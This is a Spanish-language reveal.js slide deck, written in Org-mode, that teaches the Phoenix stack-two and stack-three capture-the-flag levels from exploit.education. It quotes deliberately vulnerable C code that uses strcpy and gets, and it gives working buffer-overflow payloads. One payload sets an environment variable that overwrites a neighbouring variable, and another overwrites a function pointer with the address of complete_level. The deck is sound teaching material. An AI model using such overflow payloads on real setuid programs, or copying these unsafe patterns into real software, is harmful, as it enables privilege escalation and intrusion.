@@ -1,0 +1,339 @@
+#+title: Stack Two & Three
+#+SUBTITLE: Variables de entorno y apuntadores a funciones
+#+AUTHOR: Rising Edge - Enrique
+#+DATE: 2026-06-03
+
+:reveal_properties:
+#+REVEAL_ROOT: https://cdn.jsdelivr.net/npm/reveal.js
+#+OPTIONS: timestamp:nil toc:1 num:nil
+#+REVEAL_THEME: dracula
+:end:
+
+* Recapitulación
+
+- Argumentos (~argc~ y ~argv~)
+- Endianness (LSB y MSB)
+- Prólogo y epílogo de una función
+- Resuelto stack 0 y 1
+
+* Ejercicio stack-two
+
+** Código
+
+#+begin_src c
+/*
+ ,* phoenix/stack-two, by https://exploit.education
+ ,*
+ ,* The aim is to change the contents of the changeme variable to 0x0d0a090a
+ ,*/
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int main(int argc, char **argv) {
+  struct {
+    char buffer[64];
+    volatile int changeme;
+  } locals;
+
+  char *ptr;
+
+  printf("%s\n", BANNER);
+
+  ptr = getenv("ExploitEducation");
+  if (ptr == NULL) {
+    errx(1, "please set the ExploitEducation environment variable");
+  }
+
+  locals.changeme = 0;
+  strcpy(locals.buffer, ptr);
+
+  if (locals.changeme == 0x0d0a090a) {
+    puts("Well done, you have successfully set changeme to the correct value");
+  } else {
+    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
+        locals.changeme);
+  }
+
+  exit(0);
+}
+#+end_src
+
+** Resumiendo el código...
+
+#+begin_src text
+struct {
+  char buffer[64];
+  volatile int changeme;
+} locals;
+
+apuntador = variable_de_entorno("ExploitEducation")
+
+si apuntador es NULO
+  error()
+
+locals.changeme = 0
+strcpy(locals.buffer, ptr)
+
+si locals.changeme == 0x0d0a090a:
+    imprime "bien"
+en otro caso:
+    imprime "ya casi, valor..."
+#+end_src
+
+** Objetivo
+
+#+ATTR_REVEAL: :frag (appear)
+- Cambiar el valor de ~locals.changeme~ a ~0x0d0a090a~.
+- ¿En dónde haremos el desbordamiento ahora?
+
+** Teoría
+
+*** Variables de entorno
+
+#+ATTR_REVEAL: :frag (appear)
+- [[https://en.wikipedia.org/wiki/Environment_variable][Significado]]
+- Variable definida por usuario.
+- Afecta la ejecución y el comportamiento de procesos en una computadora.
+- Parte del entorno de ejecución de un proceso.
+- Ejemplos: ~$PATH $HOME $PS1 $EDITOR $TEMP~...
+- ¿Qué hace ~export PS1='hola: '~?
+- ¿Qué hace ~export PS1='($?) \u en \h: '~?
+- ~export~ configura una variable de entorno para procesos hijos.
+
+*** Asignando una variable de entorno temporalmente a un proceso
+
+#+begin_src bash
+ENVVAR_TEMP='hola' comando
+#+end_src
+
+*** Caracteres no imprimibles
+
+- ¿Qué caracteres corresponden a estos hexadecimales en ASCII?
+#+ATTR_REVEAL: :frag (appear)
+  - 0x0d
+  - 0x0a
+  - 0x09
+  - 0x0a
+
+*** ¿Cómo imprimimos estos caracteres?
+- [[https://stackoverflow.com/a/40092462][How to write a raw hex byte to stdout in Python 3?]]
+
+#+begin_src bash
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x48\x6f\x6c\x61\x0a\xf0\x9f\x8c\x8a\x0a")'
+#                   ^                           ^             ^^
+#                modulo                   objeto bytes     separador
+#+end_src
+
+*** Sustitución de comandos (command substitution)
+
+- Permite asignar la salida de un comando como valor a una variable de la shell.
+- Sintaxis y ejemplo:
+
+#+begin_src text
+$(COMANDO)
+#+end_src
+
+#+begin_src bash
+MI_DISTRO=$(grep "^NAME" /etc/os-release | cut -d \" -f 2)
+echo $MI_DISTRO
+#+end_src
+
+** Resolviendo stack-two...
+
+Asignamos una variable de entorno temporal igual a 64 caracteres y el valor que
+pide el nivel.
+
+#+begin_src bash
+ExploitEducation=$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x09\x0a\x0d")') /opt/phoenix/amd64/stack-two
+#+end_src
+
+** Verificación stack-two
+
+*** Análisis de archivo
+
+#+name: file-stack-one
+#+begin_src bash
+file /opt/phoenix/amd64/stack-two
+#+end_src
+
+#+begin_src text
+/opt/phoenix/amd64/stack-two: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
+#+end_src
+
+- Usa Little-Endian pues es un LSB executable
+
+*** Medidas de protección
+
+#+name: checksec-stack-one
+#+begin_src bash
+checksec /opt/phoenix/amd64/stack-two
+#+end_src
+
+#+begin_src text
+[*] '/opt/phoenix/amd64/stack-two'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+    RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'
+#+end_src
+
+- Sin medidas de protección (:
+
+*** Ejecutar GDB
+
+#+begin_src bash
+export ExploitEducation=$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x09\x0a\x0d")')
+gdb -q /opt/phoenix/amd64/stack-two
+#+end_src
+
+*** Proceso de verificación
+
+#+begin_src GDB
+disassemble main
+break *0x0400701
+break *0x0400709
+define hook-stop
+info registers
+x/28wx $rsp
+x/3i $rip
+end
+gef config context.enable 0
+run
+continue
+x/wx $rbp-0x10
+continue
+quit
+#+end_src
+
+* Ejercicio stack-three
+
+** Código
+
+#+begin_src c
+/*
+ ,* phoenix/stack-three, by https://exploit.education
+ ,*
+ ,* The aim is to change the contents of the changeme variable to 0x0d0a090a
+ ,*/
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *);
+
+void complete_level() {
+  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
+  exit(0);
+}
+
+int main(int argc, char **argv) {
+  struct {
+    char buffer[64];
+    volatile int (*fp)();
+  } locals;
+
+  printf("%s\n", BANNER);
+
+  locals.fp = NULL;
+  gets(locals.buffer);
+
+  if (locals.fp) {
+    printf("calling function pointer @ %p\n", locals.fp);
+    fflush(stdout);
+    locals.fp();
+  } else {
+    printf("function pointer remains unmodified :~( better luck next time!\n");
+  }
+
+  exit(0);
+}
+#+end_src
+
+** Resumiendo el código...
+
+- ¿Quién puede escribir el pseudocódigo o diagrama de flujo general?
+
+** Objetivo
+
+- ¿Cómo resolvemos el nivel?
+
+** Teoría
+
+*** Alternativa para obtener desensamblado
+
+- ~objdump~ muestra información de archivos objeto.
+- Podemos obtener el desensamblado invocando directamente.
+
+#+begin_src bash
+objdump -d -M intel ARCHIVO
+#+end_src
+
+*** Archivos objeto
+
+- [[https://en.wikipedia.org/wiki/Object_file][Enlace]].
+- Son aquellos que contienen código máquina o bytecode y los genera un
+  compilador o ensamblador.
+- Hasta ahora hemos usado archivos objeto [[https://en.wikipedia.org/wiki/Executable_and_Linkable_Format][ELF]], aunque también existen los COFF y
+  Mach-O
+
+** Resolviendo stack-three...
+
+1. Entender código
+2. Identificar dirección de función a la que saltar
+3. Sobrescribir búfer con dirección
+
+*** Solución
+
+Obtenemos la dirección de la función ~complete_level~, sobreescribimos el buffer
+y pasamos la direction encontrada.
+
+#+begin_src bash
+nm -C --defined-only /opt/phoenix/amd64/stack-three # Opción 1
+readelf -s /opt/phoenix/amd64/stack-three # Opción 2
+objdump -M intel -d /opt/phoenix/amd64/stack-three | grep -A6 "complete_level" # Opción 3
+objdump -d /opt/phoenix/amd64/stack-three | awk '/complete_level/ {print $1}'
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x9d\x06\x40")' | /opt/phoenix/amd64/stack-three
+#+end_src
+
+** Verificación stack-three
+
+*** Análisis de archivo
+
+#+name: file-stack-one
+#+begin_src bash
+file /opt/phoenix/amd64/stack-three
+#+end_src
+
+#+begin_src text
+/opt/phoenix/amd64/stack-three: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
+#+end_src
+
+- Usa Little-Endian pues es un LSB executable
+
+*** Proceso de verificación
+
+- Identificar dirección donde se llama al apuntador.
+- Colocar un breakpoint antes de esa llamada.
+- Analizar valor del registro RIP.
+
+* Gracias (:
+
+#+begin_quote
+Hacker is a term for both those who write code and those who exploit it.
+#+end_quote
